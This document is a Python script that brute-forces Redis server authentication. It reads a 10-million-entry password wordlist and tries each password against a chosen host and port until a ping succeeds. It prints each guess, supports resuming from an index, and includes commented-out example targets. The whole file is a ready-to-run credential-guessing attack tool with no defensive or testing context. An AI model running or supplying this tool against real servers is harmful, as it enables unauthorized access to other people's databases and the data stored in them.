import argparse
import os
import redis

HERE = os.path.dirname(os.path.abspath(__file__))
PW_LIST = f'{HERE}/../wordlists/ignis-10M.txt'


def bruteforce_auth(host, port, password):
    """Brute forces the Redis server auth.

    Args:
    host: The host of the Redis server.
    port: The port of the Redis server.
    password: The password to try.

    Returns:
    True if the password is correct, False otherwise.
    """

    client = redis.Redis(host=host, port=port, password=password)
    try:
        client.ping()
        return True
    except redis.ConnectionError as e:
        return False


def main(host, port=6379, from_idx=0):
    """Brute forces the Redis server auth."""
    with open(PW_LIST, 'r') as f:
        passwords = f.readlines()
        passwords = [password.strip() for password in passwords]

    if from_idx > 0:
        passwords = passwords[from_idx:]

    for idx, p in enumerate(passwords):
        print(f"Trying password {from_idx+idx} : {p}")
        if bruteforce_auth(host, port, p):
            print("Password found:", p)
            break


if __name__ == "__main__":
    # Argparse arguments
    # pipenv run python src/redis_brute_force.py -u "x.com"
    parser = argparse.ArgumentParser(
        description="Brute force Redis server auth"
    )
    parser.add_argument(
        "-u", "--host", default="",
        help=f"\033[32m\033[1m\nHost\033[0m"
    )
    parser.add_argument(
        "-p", "--port", default="6379",
        help=f"\033[32m\033[1m\nPort\033[0m"
    )
    parser.add_argument(
        "-f", "--from-idx", default=0,
        help=f"\033[32m\033[1m\nFrom index\033[0m"
    )
    h = parser.parse_args().host
    p = parser.parse_args().port
    fi = int(parser.parse_args().from_idx)
    # h = "mm.com"
    # p = 6379
    # fi = 40408
    main(host=h, port=p, from_idx=fi)
